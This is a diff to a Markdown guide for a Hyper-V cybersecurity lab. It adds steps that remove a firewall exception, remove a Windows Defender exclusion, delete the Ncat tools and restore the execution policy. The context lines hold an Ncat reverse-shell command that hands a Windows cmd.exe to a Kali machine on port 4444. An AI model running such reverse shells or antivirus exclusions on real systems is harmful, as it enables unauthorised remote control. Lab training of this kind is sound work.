@@ -33,7 +33,7 @@ Identify the IP addresses of both machines communicating over the Hyper-V Defaul
 To configure the firewall, administrative context is required.
 1.  Open **PowerShell as Administrator**.
 2.  Adjust the execution policy to allow local administrative commands:
-    ```powershell
+    ```PowerShell
     Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
     ```
 
@@ -48,7 +48,7 @@ Windows Defender will flag Ncat/Netcat binaries heuristically. Create a sanction
 ### Phase 4: Poking the Firewall Hole
 Allow inbound traffic strictly on the required testing port to maintain the overall host security posture.
 1.  In the Administrator PowerShell, create the exception rule:
-    ```powershell
+    ```PowerShell
     New-NetFirewallRule -DisplayName "Lab Exception - Ncat Port 4444" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow
     ```
 
@@ -64,3 +64,33 @@ Establish the Reverse Shell using the whitelisted environment.
     ncat.exe -nv <Kali_IP> 4444 -e cmd.exe
     ```
 3.  **Result:** The Kali terminal will present the Windows `cmd.exe` prompt, granting remote execution.
+
+# Cleaning up the environment to cleanly reverse the security exceptions, close the ports, and restore Windows 11 to its default zero-trust posture
+
+## 1. Step 1: Close the Firewall Port
+The inbound rule allowing TCP traffic over port 4444 needs to be deleted.
+1. Open PowerShell as Administrator.
+2. Execute the removal command targeting the exact name of the rule created earlier:
+   ```PowerShell
+   Remove-NetFirewallRule -DisplayName "Lab Exception - Ncat Port 4444"
+   ```
+
+## 2. Step 2: Remove the Windows Defender Exclusion
+Windows Defender needs to resume monitoring the directory used for the Ncat binaries. You can remove the exclusion directly via PowerShell instead of clicking through the Windows Security GUI:
+1. In the same Administrator PowerShell window, run:
+```PowerShell
+Remove-MpPreference -ExclusionPath "C:\CyberLab_Tools"
+```
+
+2. Now that the antivirus is watching that space again, securely delete the folder and the tools inside it to prevent Defender from immediately flagging the leftover binaries:
+```PowerShell
+Remove-Item -Path "C:\CyberLab_Tools" -Recurse -Force
+```
+
+## 3. Step 3: Revert the PowerShell Execution Policy
+Finally, restore the execution policy to its default, restrictive state to prevent unauthorized scripts from running.
+1. Run the following command:
+```PowerShell
+Set-ExecutionPolicy Restricted -Scope CurrentUser
+```
+2. Type Y and hit Enter to confirm the change.
